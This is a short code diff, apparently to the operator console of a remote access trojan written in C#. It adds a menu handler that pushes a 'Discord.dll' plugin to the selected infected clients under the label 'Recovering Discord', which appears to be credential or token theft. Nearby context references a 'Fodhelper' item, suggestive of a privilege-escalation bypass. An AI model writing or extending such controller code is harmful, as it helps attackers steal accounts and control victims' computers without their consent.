@@ -1630,6 +1630,27 @@ namespace Server
             }
         }
 
+        private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Discord.dll"));
+
+                foreach (Clients client in GetSelectedClients())
+                {
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                }
+                new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
         private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
